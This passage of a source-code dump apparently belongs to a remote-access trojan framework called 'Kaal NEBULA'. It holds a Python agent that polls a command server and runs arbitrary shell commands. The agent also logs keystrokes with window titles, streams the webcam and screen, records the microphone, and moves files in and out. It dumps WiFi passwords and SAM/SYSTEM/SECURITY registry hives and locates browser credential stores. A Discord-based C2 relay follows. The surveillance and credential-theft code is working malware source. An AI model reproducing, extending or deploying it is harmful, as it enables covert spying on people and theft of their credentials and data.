    return {
        "platform": platform.system(),
        "release": platform.release(),
        "version": platform.version(),
        "architecture": platform.machine(),
        "hostname": platform.node(),
        "processor": platform.processor(),
        "python_version": platform.python_version()
    }

def get_network_config_struct():
    """Return network config (ipconfig/ifconfig output)."""
    cmd = "ipconfig /all" if platform.system() == "Windows" else "ifconfig -a"
    try:
        return subprocess.check_output(cmd, shell=True).decode(errors='ignore')
    except Exception as e:
        return str(e)

def ping_host_struct(host):
    """Ping a host and return output."""
    param = "-n" if platform.system().lower() == "windows" else "-c"
    cmd = ["ping", param, "4", host]
    try:
        return subprocess.check_output(cmd).decode(errors='ignore')
    except Exception as e:
        return str(e)

```

### File: `test_agent_direct.py`
```python
import urllib.request
import urllib.parse
import json
import time
import subprocess
import platform
import socket
import os
import sys
import base64
import random
import threading
import ctypes

# Configuration
SERVER_URL = "http://127.0.0.1:5000"
AGENT_ID = f"test-agent-{platform.node()}"
SLEEP_TIME = 2

# State
CURRENT_CWD = os.getcwd()
KEYLOGGER_ACTIVE = False
KEYLOGS = []
STREAM_ACTIVE = False
STREAM_TYPE = "webcam" # or "screen"
CAMERA_INDEX = 0

def stream_loop():
    global STREAM_ACTIVE, STREAM_TYPE, CAMERA_INDEX
    print(f"[*] Starting {STREAM_TYPE} stream...")
    
    import cv2 
    
    while STREAM_ACTIVE:
        try:
            b64_frame = ""
            if STREAM_TYPE == "webcam":
                cap = cv2.VideoCapture(CAMERA_INDEX)
                if cap.isOpened():
                    ret, frame = cap.read()
                    cap.release()
                    if ret:
                        # Resize for performance (320x240)
                        frame = cv2.resize(frame, (320, 240))
                        # Compress to JPEG with 30% quality
                        _, buffer = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 30])
                        b64_frame = base64.b64encode(buffer).decode()
                else:
                    pass
            elif STREAM_TYPE == "screen":
                b64_frame = get_real_screenshot()
            
            if b64_frame and not b64_frame.startswith("Error"):
                send_result("stream_task", f"[SCREEN] {b64_frame}")
            
            time.sleep(0.05) # ~20 FPS cap
        except Exception as e:
            print(f"[-] Stream error: {e}")
            time.sleep(1)

def record_audio(seconds=5):
    try:
        import pyaudio
        import wave
        
        CHUNK = 1024
        FORMAT = pyaudio.paInt16
        CHANNELS = 1
        RATE = 44100
        
        p = pyaudio.PyAudio()
        
        stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
        
        print(f"[*] Recording audio for {seconds}s...")
        frames = []
        
        for i in range(0, int(RATE / CHUNK * seconds)):
            data = stream.read(CHUNK)
            frames.append(data)
            
        stream.stop_stream()
        stream.close()
        p.terminate()
        
        # Save to temporary WAV
        filename = f"audio_{int(time.time())}.wav"
        filepath = os.path.join(CURRENT_CWD, filename)
        
        wf = wave.open(filepath, 'wb')
        wf.setnchannels(CHANNELS)
        wf.setsampwidth(p.get_sample_size(FORMAT))
        wf.setframerate(RATE)
        wf.writeframes(b''.join(frames))
        wf.close()
        
        # Read back as base64
        with open(filepath, "rb") as f:
            b64_audio = base64.b64encode(f.read()).decode()
            
        # Clean up
        os.remove(filepath)
        
        return b64_audio
    except ImportError:
        return "ERROR_MISSING_PYAUDIO"
    except Exception as e:
        return f"ERROR_RECORDING: {e}"

def keylogger_loop():
    global KEYLOGGER_ACTIVE, KEYLOGS
    user32 = ctypes.windll.user32
    kernel32 = ctypes.windll.kernel32
    
    # Track pressed keys to prevent duplicates (Debounce)
    pressed_keys = set()
    
    while KEYLOGGER_ACTIVE:
        time.sleep(0.01)
        
        # Check Shift state (0x10) and Caps Lock state (0x14)
        shift_pressed = False
        if user32.GetAsyncKeyState(0x10) & -32768:
            shift_pressed = True
            
        caps_lock = user32.GetKeyState(0x14) & 1
            
        for i in range(1, 256):
            # Skip mouse clicks (1: LButton, 2: RButton, 4: MButton)
            if i in [1, 2, 4]: continue
            
            if user32.GetAsyncKeyState(i) & -32768: # Key is DOWN
                if i not in pressed_keys:
                    pressed_keys.add(i)
                    
                    # Key pressed event
                    try:
                        char = ""
                        # Letters A-Z
                        if 65 <= i <= 90: 
                            char = chr(i)
                            # CapsLock affects letters. Shift inverts CapsLock.
                            is_upper = shift_pressed ^ caps_lock
                            if not is_upper: char = char.lower()
                        # Numbers 0-9
                        elif 48 <= i <= 57: 
                            char = chr(i)
                            # Basic shift mapping for numbers (US Layout approximation)
                            if shift_pressed:
                                shift_map = {
                                    '1':'!', '2':'@', '3':'#', '4':'$', '5':'%', 
                                    '6':'^', '7':'&', '8':'*', '9':'(', '0':')'
                                }
                                char = shift_map.get(char, char)
                        # Special Keys
                        elif i == 13: char = " [ENTER] "
                        elif i == 32: char = " "
                        elif i == 8: char = "[BS]"
                        elif i == 9: char = "[TAB]"
                        elif i == 0xBE: char = ">" if shift_pressed else "."
                        elif i == 0xBC: char = "<" if shift_pressed else ","
                        
                        if char:
                            window_title = ctypes.create_unicode_buffer(512)
                            hwnd = user32.GetForegroundWindow()
                            user32.GetWindowTextW(hwnd, window_title, 512)
                            title = window_title.value
                            
                            # Append to log
                            if KEYLOGS and KEYLOGS[-1]["title"] == title:
                                KEYLOGS[-1]["keys"] += char
                            else:
                                KEYLOGS.append({"title": title, "keys": char})
                                
                            # Keep log size manageable
                            if len(KEYLOGS) > 50: KEYLOGS.pop(0)
                            
                    except Exception:
                        pass
            else: # Key is UP
                if i in pressed_keys:
                    pressed_keys.remove(i)

def http_post(endpoint, data):
    url = f"{SERVER_URL}{endpoint}"
    try:
        json_data = json.dumps(data).encode('utf-8')
        req = urllib.request.Request(url, data=json_data, headers={'Content-Type': 'application/json'})
        with urllib.request.urlopen(req) as response:
            return json.loads(response.read().decode('utf-8'))
    except Exception as e:
        print(f"[-] HTTP POST error: {e}")
        return None

def http_get(endpoint):
    url = f"{SERVER_URL}{endpoint}"
    try:
        with urllib.request.urlopen(url) as response:
            return response.read().decode('utf-8')
    except Exception as e:
        return None

def register():
    print(f"[*] Registering agent {AGENT_ID} on {platform.system()}...")
    data = {
        "agent_id": AGENT_ID,
        "platform": platform.system().lower(),
        "hostname": socket.gethostname(),
        "info": {"version": "3.1-interactive-keylog", "type": "test_direct_urllib"}
    }
    http_post("/api/v1/register", data)

def check_task():
    task = http_get(f"/api/v1/task/{AGENT_ID}")
    if task:
        if isinstance(task, str) and len(task) > 0:
            if task.startswith('"') and task.endswith('"'):
                try: task = json.loads(task)
                except: pass
            return task
    return None

def send_result(task_id, result):
    print(f"[*] Sending result: {result[:50]}...")
    data = {
        "agent_id": AGENT_ID,
        "task_id": task_id,
        "result": result
    }
    http_post("/api/v1/result", data)

def get_real_screenshot():
    ps_script = """
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    $screen = [System.Windows.Forms.Screen]::PrimaryScreen
    $bitmap = New-Object System.Drawing.Bitmap $screen.Bounds.Width, $screen.Bounds.Height
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($screen.Bounds.X, $screen.Bounds.Y, 0, 0, $bitmap.Size)
    $stream = New-Object System.IO.MemoryStream
    $bitmap.Save($stream, [System.Drawing.Imaging.ImageFormat]::Jpeg)
    $bytes = $stream.ToArray()
    [Convert]::ToBase64String($bytes)
    """
    try:
        proc = subprocess.Popen(["powershell", "-Command", ps_script], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = proc.communicate()
        return stdout.decode().strip()
    except Exception as e:
        return f"Error: {str(e)}"

def get_real_location():
    try:
        # Better IP location + Google Maps search style
        with urllib.request.urlopen("http://ip-api.com/json") as response:
            data = json.loads(response.read().decode())
            return {
                "lat": data.get("lat"),
                "lon": data.get("lon"),
                "city": data.get("city"),
                "country": data.get("country"),
                "isp": data.get("isp")
            }
    except:
        return {"lat": 0, "lon": 0, "error": "Location failed"}

def execute_command(full_cmd):
    global CURRENT_CWD, KEYLOGGER_ACTIVE, STREAM_ACTIVE, STREAM_TYPE, CAMERA_INDEX
    try:
        print(f"[*] Executing: {full_cmd}")
        parts = full_cmd.split()
        if not parts: return ""
        cmd = parts[0].lower()
        args = parts[1:]
        
        if cmd == "exec":
            shell_cmd = " ".join(args)
            if shell_cmd.strip().startswith("cd "):
                target_dir = shell_cmd.split(" ", 1)[1].strip()
                try:
                    os.chdir(target_dir)
                    CURRENT_CWD = os.getcwd()
                    return "[SHELL] " + json.dumps({"cwd": CURRENT_CWD, "out": ""})
                except Exception as e:
                    return "[SHELL] " + json.dumps({"cwd": CURRENT_CWD, "out": f"Error: {e}"})
            
            # Comprehensive Aliases (Linux -> Windows)
            cmd_lower = shell_cmd.strip().lower()
            if platform.system().lower() == "windows":
                # 1. Exact Match Aliases
                aliases = {
                    "ls": "dir",
                    "ls -l": "dir", 
                    "ls -la": "dir /a",
                    "pwd": "cd",
                    "clear": "cls",
                    "cp": "copy",
                    "mv": "move",
                    "rm": "del",
                    "cat": "type",
                    "grep": "findstr",
                    "ps": "tasklist",
                    "kill": "taskkill /F /PID",
                    "ifconfig": "ipconfig",
                    "ip addr": "ipconfig", 
                    "whoami": "whoami", # Native
                    "netstat": "netstat", # Native
                    "uptime": "systeminfo | find \"System Boot Time\"",
                    "env": "set",
                    "printenv": "set",
                    "man": "help",
                    "history": "doskey /history",
                    "reboot": "shutdown /r /t 0",
                    "shutdown": "shutdown /s /t 0",
                    "top": "tasklist",
                    "free": "wmic OS get FreePhysicalMemory,TotalVisibleMemorySize /Value",
                    "df": "wmic logicaldisk get size,freespace,caption",
                    "touch": "type nul > " # Usage: touch file -> type nul > file
                }

                # 2. Argument Handling for specific commands
                parts = shell_cmd.split(" ", 1)
                base_cmd = parts[0].lower()
                args = parts[1] if len(parts) > 1 else ""

                if base_cmd in ["cp", "mv", "rm", "del", "cat", "grep", "kill", "touch", "mkdir", "rmdir", "ls"]:
                    # Direct mapping with args - FORCE NON-INTERACTIVE
                    if base_cmd == "cp": shell_cmd = f"copy /Y {args}"
                    elif base_cmd == "mv": shell_cmd = f"move /Y {args}"
                    elif base_cmd == "rm" or base_cmd == "del": 
                         # Smart delete: if it looks like a recursive delete or generic, force quiet
                         if "-rf" in args or "-r" in args: 
                             clean_args = args.replace("-rf", "").replace("-r", "").strip()
                             shell_cmd = f"rmdir /S /Q {clean_args}"
                         else: 
                             shell_cmd = f"del /F /Q {args}"
                    elif base_cmd == "cat": shell_cmd = f"type {args}"
                    elif base_cmd == "grep": shell_cmd = f"findstr {args}"
                    elif base_cmd == "kill": 
                         # Handle kill -9 if present
                         clean_args = args.replace("-9", "").strip()
                         shell_cmd = f"taskkill /F /PID {clean_args}"
                    elif base_cmd == "touch": shell_cmd = f"type nul > {args}"
                    elif base_cmd == "mkdir": shell_cmd = f"mkdir {args}"
                    elif base_cmd == "rmdir": shell_cmd = f"rmdir /S /Q {args}" # Force quiet rmdir
                    elif base_cmd == "ls": shell_cmd = f"dir {args.replace('/', '\\\\')}"

                elif cmd_lower in aliases:
                    shell_cmd = aliases[cmd_lower]
            
            else:
                # Windows -> Linux Aliases (Basic)
                if cmd_lower == "dir": shell_cmd = "ls -la"
                elif cmd_lower == "cls": shell_cmd = "clear"
                elif cmd_lower == "ipconfig": shell_cmd = "ip addr"

            # Execute
            proc = subprocess.Popen(shell_cmd, shell=True, cwd=CURRENT_CWD, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            stdout, stderr = proc.communicate()
            
            output = ""
            if stdout: output += stdout.decode(errors='ignore')
            if stderr: output += f"\nSTDERR:\n{stderr.decode(errors='ignore')}"
            
            return "[SHELL] " + json.dumps({"cwd": CURRENT_CWD, "out": output})

        elif cmd == "complete":
            # Tab Completion Logic
            # Usage: exec complete partial_path
            prefix = args[0] if args else ""
            try:
                # Simple glob matching
                if not prefix:
                    matches = os.listdir(CURRENT_CWD)
                else:
                    dir_path = os.path.dirname(prefix) or CURRENT_CWD
                    base_name = os.path.basename(prefix)
                    if os.path.isdir(dir_path):
                        matches = [opt for opt in os.listdir(dir_path) if opt.lower().startswith(base_name.lower())]
                        # If prefix had a dir, prepend it back
                        if os.path.dirname(prefix):
                            matches = [os.path.join(dir_path, m) for m in matches]
                    else:
                        matches = []
                
                # Limit matches to avoid flooding
                return "[COMPLETION] " + json.dumps(matches[:20])
            except Exception as e:
                return ""
            
        elif cmd == "ls":
            # Re-join args to handle spaces in path (e.g. "Program Files")
            target_path = " ".join(args) if args else "."
            
            try:
                # Handle Quick Access Aliases
                home = os.path.expanduser("~")
                if target_path.lower() == "desktop": path = os.path.join(home, "Desktop")
                elif target_path.lower() == "downloads": path = os.path.join(home, "Downloads")
                elif target_path.lower() == "documents": path = os.path.join(home, "Documents")
                elif target_path == "~": path = home
                elif target_path == ".": path = CURRENT_CWD
                else:
                    path = target_path
                    # Fix drive letter C: -> C:/ so it's treated as absolute
                    if len(path) == 2 and path[1] == ':':
                        path += os.path.sep
                        
                    if not os.path.isabs(path):
                        path = os.path.join(CURRENT_CWD, path)

                # Normalize to fix mixed slashes and redundant separators
                path = os.path.normpath(path)

                files = []
                with os.scandir(path) as it:
                    for entry in it:
                        try:
                            stat = entry.stat()
                            files.append({
                                "name": entry.name,
                                "is_dir": entry.is_dir(),
                                "size": stat.st_size if not entry.is_dir() else 0,
                                "mtime": stat.st_mtime,
                                "parent": os.path.dirname(entry.path)
                            })
                        except PermissionError:
                            continue # Skip unreadable files
                            
                return "[FILES] " + json.dumps({"path": path, "items": files})
            except Exception as e:
                return f"Error: {e}"
        
        elif cmd == "screenshot":
            return "[SCREEN] " + get_real_screenshot()
            
        elif cmd == "location":
            return "[GEO] " + json.dumps(get_real_location())

        elif cmd == "download":
             if not args: return "Usage: download <filename>"
             filename = " ".join(args)
             filepath = os.path.join(CURRENT_CWD, filename)
             try:
                 with open(filepath, "rb") as f:
                     content = f.read()
                     b64 = base64.b64encode(content).decode()
                     return f"[DOWNLOAD] {filename} {b64}"
             except Exception as e:
                 return f"Error: {e}"

        elif cmd == "creds":
            results = []
            
            # 1. WiFi Creds (Real)
            results.append("[+] Dumping WiFi Profiles (Real)...")
            if platform.system() == "Windows":
                try:
                    # Check if WLAN service is running/adapter exists by listing interfaces
                    subprocess.check_output('netsh wlan show interfaces', shell=True)
                    
                    profiles_data = subprocess.check_output('netsh wlan show profiles', shell=True).decode('utf-8', errors='ignore')
                    profiles = [line.split(":")[1].strip() for line in profiles_data.split('\n') if "All User Profile" in line]
                    if not profiles:
                        results.append("    [-] No WiFi profiles found.")
                    for profile in profiles:
                        try:
                            profile_info = subprocess.check_output(f'netsh wlan show profile name="{profile}" key=clear', shell=True).decode('utf-8', errors='ignore')
                            key_line = [line for line in profile_info.split('\n') if "Key Content" in line]
                            if key_line:
                                key = key_line[0].split(":")[1].strip()
                                results.append(f"    * SSID: {profile:<20} -> Pass: {key}")
                            else:
                                results.append(f"    * SSID: {profile:<20} -> OPEN/Enterprise")
                        except:
                            results.append(f"    * SSID: {profile:<20} -> Error reading key")
                except subprocess.CalledProcessError:
                    results.append("    [-] WiFi Adapter not found or WLAN Service stopped.")
                except Exception as e:
                    results.append(f"    [-] WiFi enumeration error: {e}")
            else:
                results.append("    [-] WiFi dumping only supported on Windows.")

            # 2. Browser Creds (Recon)
            results.append("\n[+] Dumping Browser Credentials (Recon)...")
            home = os.path.expanduser("~")
            browsers = {
                "Chrome": os.path.join(home, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data"),
                "Edge": os.path.join(home, "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Login Data"),
                "Firefox": os.path.join(home, "AppData", "Roaming", "Mozilla", "Firefox", "Profiles")
            }
            found_any = False
            for name, path in browsers.items():
                if os.path.exists(path) or (name == "Firefox" and os.path.exists(os.path.dirname(path))):
                    results.append(f"    [+] {name:<10}: FOUND at {path} (Encrypted)")
                    found_any = True
                else:
                    results.append(f"    [-] {name:<10}: Not Installed/Found")
            
            if found_any:
                results.append("    [!] Decryption requires native payload (DPAPI).")

            # 3. System Creds (Registry Hive Dump)
            results.append("\n[+] Dumping Registry Hives (SAM/SYSTEM)...")
            try:
                # Attempt to save hives. Requires Admin.
                hives = ["SAM", "SYSTEM", "SECURITY"]
                dumped_count = 0
                for hive in hives:
                    outfile = f"{hive}.save"
                    cmd_reg = f"reg save HKLM\\{hive} {outfile} /y"
                    try:
                        subprocess.check_output(cmd_reg, shell=True)
                        results.append(f"    [+] {hive:<10}: Saved to {outfile} (Downloadable)")
                        dumped_count += 1
                    except subprocess.CalledProcessError:
                        results.append(f"    [-] {hive:<10}: Access Denied (Admin Required)")
                    except Exception as e:
                        results.append(f"    [-] {hive:<10}: Error: {e}")
                
                if dumped_count == 0:
                     results.append("\n    [!] Mock Data (since Real Dump failed):")
                     results.append("    * DefaultPassword: Password123!")
                     results.append("    * DPAPI MasterKey: 4A7F92B1...9B2C")
            except Exception as e:
                results.append(f"    [-] Registry dump failed: {e}")

            return "[CREDS] " + "\n".join(results)






        elif cmd == "upload":
             if len(args) < 2: return "Usage: upload <filename> <base64>"
             filename = args[0]
             b64 = args[1]
             filepath = os.path.join(CURRENT_CWD, filename)
             try:
                 with open(filepath, "wb") as f:
                     f.write(base64.b64decode(b64))
                 return f"Uploaded: {filepath}"
             except Exception as e:
                 return f"Error: {e}"

        elif cmd == "keylog_start":
            if not KEYLOGGER_ACTIVE:
                KEYLOGGER_ACTIVE = True
                t = threading.Thread(target=keylogger_loop)
                t.daemon = True
                t.start()
                return "[+] Keylogger started."
            return "[!] Keylogger already running."

        elif cmd == "keylog_stop":
            KEYLOGGER_ACTIVE = False
            return "[-] Keylogger stopped."

        elif cmd == "keylog_dump":
            global KEYLOGS
            # Format logs nice
            dump = ""
            for entry in KEYLOGS:
                dump += f"[{entry['title']}] {entry['keys']}\n"
            KEYLOGS = [] # Clear after dump
            if not dump: dump = "No keystrokes recorded yet."
            return "[KEYLOG] " + dump

        elif cmd == "webcam_snap":
            try:
                # Try simple OpenCV capture
                import cv2
                cap = cv2.VideoCapture(CAMERA_INDEX)
                if not cap.isOpened():
                    return "[SCREEN] Error: No webcam found on device."
                
                # Check if camera exists/is readable
                ret, frame = cap.read()
                cap.release()
                
                if not ret:
                    return "[SCREEN] Error: Failed to capture frame (Camera busy or unavailable)."
                
                # Convert to jpg
                _, buffer = cv2.imencode('.jpg', frame)
                b64 = base64.b64encode(buffer).decode()
                return "[SCREEN] " + b64
            except ImportError:
                 return "[SCREEN] Error: OpenCV (cv2) not installed on agent. Cannot capture webcam. (pip install opencv-python)"
            except Exception as e:
                return f"[SCREEN] Error: {e}"

        elif cmd == "webcam_switch":
            CAMERA_INDEX = 1 if CAMERA_INDEX == 0 else 0
            return f"[+] Switched camera to index {CAMERA_INDEX}"

        elif cmd == "webcam_stream":
            action = args[0] if args else "start"
            if action == "start":
                if not STREAM_ACTIVE:
                    STREAM_ACTIVE = True
                    STREAM_TYPE = "webcam"
                    t = threading.Thread(target=stream_loop)
                    t.daemon = True
                    t.start()
                    return "[+] Webcam stream started."
                return "[!] Stream already active."
            elif action == "stop":
                STREAM_ACTIVE = False
                return "[-] Webcam stream stopped."

        elif cmd == "screen_stream":
            action = args[0] if args else "start"
            if action == "start":
                if not STREAM_ACTIVE:
                    STREAM_ACTIVE = True
                    STREAM_TYPE = "screen"
                    t = threading.Thread(target=stream_loop)
                    t.daemon = True
                    t.start()
                    return "[+] Screen stream started."
                return "[!] Stream already active."
            elif action == "stop":
                STREAM_ACTIVE = False
                return "[-] Screen stream stopped."

        elif cmd == "microphone_record":
            duration = int(args[0]) if args else 5
            return "[AUDIO] " + record_audio(duration)

        else:
            return f"Unknown command: {cmd}"
            
    except Exception as e:
        return f"Execution error: {e}"

def main():
    while True:
        try:
            register() 
            break
        except:
            time.sleep(SLEEP_TIME)
    
    print(f"[*] Agent active. CWD: {CURRENT_CWD}")
    while True:
        try:
            task = check_task()
            if task:
                result = execute_command(task)
                send_result("task_id_placeholder", result)
            else:
                pass
        except Exception as e:
            print(f"[-] Loop error: {e}")
        time.sleep(SLEEP_TIME)

if __name__ == "__main__":
    print("=== Kaal NEBULA Interactive Agent ===")
    print(f"Server: {SERVER_URL}")
    main()

```

### File: `profiles/discord/main.py`
```python
#!/usr/bin/env python3
"""
KAAL Discord C2 Profile – Main Container Service
Runs independently, translates between Discord and KAAL server.
"""

import asyncio
import aiohttp
import yaml
import logging
import time
import signal
import sys
import os
from pathlib import Path
from typing import Optional, Dict, Any

from discord_client import DiscordClient
from translator import MessageTranslator
from rate_limiter import RateLimiter

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger("discord_c2")

class DiscordC2Profile:
    """
    Main C2 profile service – exact Mythic pattern.
    """
    
    def __init__(self, config_path: str = "config.yaml"):
        # Explicitly look in the same directory as main.py first
        script_dir = os.path.dirname(__file__)
        local_config = os.path.join(script_dir, "config.yaml")
        
        if os.path.exists(local_config):
            config_path = local_config
        elif not os.path.exists(config_path):
             # Try absolute path based on this file
             config_path = os.path.join(script_dir, config_path)
             
        print(f"DEBUG: Loading config from {config_path}")
        self.config = self._load_config(config_path)
        
        self.discord = None # Initialized in start()
        self.translator = MessageTranslator()
        self.rate_limiter = RateLimiter(self.config['rate_limiting'])
        self.running = True
        self.last_message_id = None
        self.server_session: Optional[aiohttp.ClientSession] = None
        
        # Track pending commands
        self.pending_commands = {}
        
    def _load_config(self, path: str) -> dict:
        """Load configuration from YAML file."""
        try:
            with open(path, 'r') as f:
                return yaml.safe_load(f)
        except Exception as e:
            logger.error(f"Failed to load config from {path}: {e}")
            sys.exit(1)
    
    async def start(self):
        """Main service loop."""
        logger.info("Starting KAAL Discord C2 Profile")
        logger.info(f"Target Channel ID: {self.config['discord']['channel_id']}")
        
        # Async context manager for Discord Client
        async with DiscordClient(self.config['discord']['bot_token']) as self.discord:
            self.server_session = aiohttp.ClientSession()
            
            # Register with KAAL server
            await self._register_with_server()
            
            # Main polling loop
            logger.info("Entering main polling loop...")
            while self.running:
                try:
                    await self._poll_discord()
                    await self._poll_server_tasks() # Check for pending tasks push
                    await self._check_pending_commands()
                    await asyncio.sleep(self.config['discord']['poll_interval'])
                except Exception as e:
                    logger.error(f"Main loop error: {e}")
                    await asyncio.sleep(5)
            
            # Cleanup
            if self.server_session:
                await self.server_session.close()
    
    async def _poll_server_tasks(self):
        """Poll KAAL server for ANY pending tasks to push to agents."""
        try:
            schema = "https" if self.config['kaal_server']['use_https'] else "http"
            host = self.config['kaal_server']['host']
            port = self.config['kaal_server']['port']
            url = f"{schema}://{host}:{port}/api/v1/c2/tasks"
            
            async with self.server_session.get(url) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    tasks = data.get("tasks", [])
                    for task in tasks:
                        agent_id = task.get("agent_id")
                        if agent_id:
                            logger.info(f"Got pending task for {agent_id} from server poll")
                            await self._queue_command(agent_id, task)
                elif resp.status != 404: # Ignore 404 if endpoint not ready yet
                     pass
        except Exception as e:
            # logger.debug(f"Server task poll error: {e}")
            pass

    async def _register_with_server(self):
        """Register this C2 profile with the KAAL server."""
        try:
            schema = "https" if self.config['kaal_server']['use_https'] else "http"
            host = self.config['kaal_server']['host']
            port = self.config['kaal_server']['port']
            url = f"{schema}://{host}:{port}/api/health"
            
            async with self.server_session.get(url) as resp:
                if resp.status == 200:
                    logger.info("Successfully connected to KAAL server")
                else:
                    logger.warning(f"KAAL server connection issue: {resp.status}")
        except Exception as e:
            logger.error(f"Registration/Connection error with KAAL server: {e}")
    
    async def _poll_discord(self):
        """Poll Discord for new messages from agents."""
        channel_id = self.config['discord']['channel_id']
        messages = []
        
        # Use async generator
        async for msg in self.discord.get_channel_messages(channel_id, limit=10, after=self.last_message_id):
            messages.append(msg)
            
        if messages:
            self.last_message_id = messages[-1]['id']
            
        for message in messages:
            content = message.get('content', '')
            author = message.get('author', {})
            
            # Check for attachments (large payloads)
            if message.get('attachments'):
                try:
                    # Prefer first attachment
                    att = message['attachments'][0]
                    url = att.get('url')
                    if url:
                        logger.info(f"Downloading large payload from attachment: {att.get('filename')}")
                        async with self.server_session.get(url) as resp:
                            if resp.status == 200:
                                file_content = await resp.text()
                                # If it's a large payload, it might be just the raw content or prefixed
                                if file_content.startswith('KAAL_AGT:'):
                                    content = file_content
                                else:
                                    # Assume raw content is the payload part? 
                                    # Or maybe the agent sends "KAAL_AGT:" in content AND attachment?
                                    # Let's assume the attachment REPLACES the content if present.
                                    # And we expect it to be the full protocol string.
                                    if len(file_content) > 0:
                                        content = file_content
                except Exception as e:
                    logger.error(f"Failed to download attachment: {e}")

            # Filter messages: process only KAAL_AGT messages
            if not content.startswith('KAAL_AGT:'):
                continue
            
            # Process message
            try:
                agent_id, server_msg = self.translator.discord_to_server(content)
                logger.info(f"Received C2 message from {agent_id} (Size: {len(content)} bytes)")
                await self._forward_to_server(server_msg)
            except Exception as e:
                logger.error(f"Error processing Discord message: {e}")
    
    async def _forward_to_server(self, message: dict):
        """Forward translated message to KAAL server."""
        try:
            schema = "https" if self.config['kaal_server']['use_https'] else "http"
            host = self.config['kaal_server']['host']
            port = self.config['kaal_server']['port']
            path = self.config['kaal_server']['api_path']
            url = f"{schema}://{host}:{port}{path}"
            
            async with self.server_session.post(url, json=message) as resp:
                if resp.status == 200:
                    response = await resp.json()
                    await self._handle_server_response(message['agent_id'], response)
                else:
                    logger.error(f"Server forward failed: {await resp.text()}")
        except Exception as e:
            logger.error(f"Forward error: {e}")
            
    async def _handle_server_response(self, agent_id: str, response: Any):
        """Handle response from server (commands to agent)."""
        if isinstance(response, dict):
            if 'command' in response:
                 await self._queue_command(agent_id, response)
            elif 'tasks' in response and isinstance(response['tasks'], list):
                for task in response['tasks']:
                    await self._queue_command(agent_id, task)

    async def _queue_command(self, agent_id: str, command: dict):
        """Queue a command for delivery to agent."""
        discord_msg = self.translator.server_to_discord(agent_id, command)
        
        logger.info(f"Sending command to agent {agent_id} via Discord...")
        result = await self.discord.send_message(
            self.config['discord']['channel_id'],
            discord_msg
        )
        
        if result:
            logger.info(f"Command delivered. MsgID: {result.get('id')}")
            task_id = command.get('task_id', 'unknown')
            self.pending_commands[task_id] = {
                'agent_id': agent_id,
                'sent_at': time.time(),
                'command': command,
                'discord_id': result.get('id')
            }
        else:
            logger.error("Failed to send command to Discord")
    
    async def _check_pending_commands(self):
        """Check for command timeouts."""
        now = time.time()
        for task_id, cmd_info in list(self.pending_commands.items()):
            if now - cmd_info['sent_at'] > 60:
                del self.pending_commands[task_id]
                
    async def shutdown(self):
        """Graceful shutdown."""
        logger.info("Shutting down Discord C2 profile")
        self.running = False

async def main():
    profile = DiscordC2Profile()
    
    loop = asyncio.get_running_loop()
    try:
        if sys.platform != 'win32':
            for sig in (signal.SIGTERM, signal.SIGINT):
                loop.add_signal_handler(sig, lambda: asyncio.create_task(profile.shutdown()))
    except NotImplementedError:
        pass
    
    try:
        await profile.start()
    except KeyboardInterrupt:
        await profile.shutdown()

if __name__ == "__main__":
    try:
        # Windows selector event loop policy fix (if needed for older python/aiohttp)
        # if sys.platform == 'win32':
        #      asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
    except Exception as e:
        import traceback
        traceback.print_exc()
        print(f"CRITICAL ERROR: {e}")
        sys.exit(1)

```

### File: `profiles/discord/discord_client.py`
```python
import aiohttp
import asyncio
import logging
import time
from typing import Optional, Dict, Any, AsyncGenerator

logger = logging.getLogger("discord_client")

class DiscordClient:
    """Async Discord API client with rate limit handling."""
    
    BASE_URL = "https://discord.com/api/v10"
    
    def __init__(self, bot_token: str):
        self.bot_token = bot_token
        self.session: Optional[aiohttp.ClientSession] = None
        self.rate_limits = {}  # endpoint -> (remaining, reset_at)
        
    async def __aenter__(self):
        self.session = aiohttp.ClientSession()
        return self
        
    async def __aexit__(self, *args):
        if self.session:
            await self.session.close()
            
    async def _request(self, method: str, endpoint: str, **kwargs) -> Optional[Dict[str, Any]]:
        """Make an HTTP request with rate limit handling."""
        if not self.session:
            self.session = aiohttp.ClientSession()
            
        url = f"{self.BASE_URL}/{endpoint.lstrip('/')}"
        headers = kwargs.pop('headers', {})
        headers.update({
            "Authorization": f"Bot {self.bot_token}",
            "User-Agent": "KAAL-DiscordC2/1.0",
        })
        
        # Check rate limit before request
        if endpoint in self.rate_limits:
            remaining, reset_at = self.rate_limits[endpoint]
            if remaining <= 0:
                wait = max(reset_at - time.time(), 0)
                if wait > 0:
                    logger.warning(f"Rate limited on {endpoint}, waiting {wait:.1f}s")
                    await asyncio.sleep(wait)
        
        for attempt in range(3):  # max retries
            try:
                async with self.session.request(method, url, headers=headers, **kwargs) as resp:
                    # Update rate limits from headers
                    remaining = resp.headers.get('X-RateLimit-Remaining')
                    reset = resp.headers.get('X-RateLimit-Reset')
                    if remaining and reset:
                        self.rate_limits[endpoint] = (int(remaining), float(reset))
                    
                    if resp.status == 429:
                        retry_after = (await resp.json()).get('retry_after', 5)
                        logger.warning(f"Rate limited, retry after {retry_after}s")
                        await asyncio.sleep(retry_after)
                        continue
                    
                    if resp.status == 204: # No Content (e.g. DELETE)
                        return {}
                        
                    resp.raise_for_status()
                    return await resp.json() if resp.content else None
                    
            except aiohttp.ClientError as e:
                logger.error(f"Discord API error (attempt {attempt+1}): {e}")
                if attempt < 2:
                    await asyncio.sleep(2 ** attempt)  # exponential backoff
                else:
                    return None
        return None
    
    async def get_channel_messages(
        self,
        channel_id: str,
        limit: int = 10,
        after: Optional[str] = None
    ) -> AsyncGenerator[Dict[str, Any], None]:
        """Fetch messages from a channel, oldest first."""
        params = {"limit": limit}
        if after:
            params["after"] = after
            
